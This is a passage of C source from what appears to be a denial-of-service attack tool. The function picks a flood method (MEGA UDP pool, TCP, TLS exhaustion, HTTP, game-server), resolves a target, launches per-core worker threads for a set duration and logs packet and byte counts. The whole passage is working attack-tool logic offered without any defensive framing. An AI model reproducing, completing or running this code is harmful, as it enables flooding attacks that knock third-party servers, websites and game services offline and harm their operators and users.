    } else if (atk->tls_exhaust || !strcmp(nm, "TLS") || !strcmp(nm, "TLS_EXHAUST")) {
        tag = 3; label = "TLS";
    } else if (!strcmp(nm, "HTTP") || !strcmp(nm, "HTTPS") || !strcmp(nm, "WEB")) {
        tag = 4; label = "HTTP";
    } else if (!strcmp(nm, "GAME") || !strcmp(nm, "NRO")) {
        tag = 5; label = "GAME";
    } else {
        fprintf(stderr, "[atk] unknown method '%s' (use MEGA|PSPE|TCP|TLS|HTTP|GAME)\n", nm);
        set_attack_active(0);
        free(ctx);
        return NULL;
    }

    /* Resolve target */
    struct sockaddr_in ta;
    memset(&ta, 0, sizeof(ta));
    ta.sin_family = AF_INET;
    ta.sin_port = htons((uint16_t)atk->port);
    if (resolve_target(atk->target, &ta.sin_addr) != 0) {
        fprintf(stderr, "[atk] resolve fail: %s\n", atk->target);
        set_attack_active(0); free(ctx); return NULL;
    }

    /* Thread count: MEGA = 2x cores (base THREAD_MULTIPLIER), others = cores. */
    int cores = get_nprocs();
    if (cores < 1) cores = 1;
    int threads = (tag == 6) ? (cores * 2) : cores;
    if (threads > 64) threads = 64;
    if (threads < 1) threads = 1;

    /* MEGA: one shared UDP pool, split across threads (exact base layout) */
    int *mega_pool = NULL;
    int mega_pool_n = 0;
    if (tag == 6) {
        mega_pool_n = mega_create_pool(&mega_pool);
        if (mega_pool_n <= 0) {
            fprintf(stderr, "[atk] MEGA: failed to create UDP pool\n");
            set_attack_active(0); free(ctx); return NULL;
        }
        fprintf(stderr, "[atk] MEGA pool: %d UDP sockets (shared, base-style)\n", mega_pool_n);
    }

    pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
    AttackThread *mt = calloc((size_t)threads, sizeof(AttackThread));
    if (!tids || !mt) {
        free(tids); free(mt);
        if (mega_pool) {
            for (int i = 0; i < mega_pool_n; i++) close(mega_pool[i]);
            free(mega_pool);
        }
        set_attack_active(0); free(ctx); return NULL;
    }

    fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d (cores=%d)\n",
            label, atk->target, atk->port, atk->duration_secs, threads, cores);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
    pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024); /* base: 8MB */

    int socks_per = (tag == 6 && threads > 0) ? (mega_pool_n / threads) : 0;
    if (tag == 6 && socks_per < 1) socks_per = 1;

    for (int i = 0; i < threads; i++) {
        mt[i].target     = ta;
        mt[i].port_base  = atk->port;
        mt[i].duration   = atk->duration_secs;
        mt[i].worker_id  = i;
        mt[i].method_tag = tag;
        strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
        if (atk->open_ports[0])
            strncpy(mt[i].open_ports, atk->open_ports, sizeof(mt[i].open_ports) - 1);
        else
            snprintf(mt[i].open_ports, sizeof(mt[i].open_ports), "%d", atk->port);
        if (tag == 6 && mega_pool) {
            int off = i * socks_per;
            if (off >= mega_pool_n) off = mega_pool_n - 1;
            mt[i].mega_socks = &mega_pool[off];
            mt[i].mega_sock_count = (i == threads - 1)
                ? (mega_pool_n - off)
                : socks_per;
            if (mt[i].mega_sock_count < 1) mt[i].mega_sock_count = 1;
        }
        pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
    }
    pthread_attr_destroy(&attr);

    while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
    request_attack_stop();
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(mt);

    if (mega_pool) {
        for (int i = 0; i < mega_pool_n; i++) close(mega_pool[i]);
        free(mega_pool);
    }

    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    set_attack_active(0);
    free(ctx);
    return NULL;
}
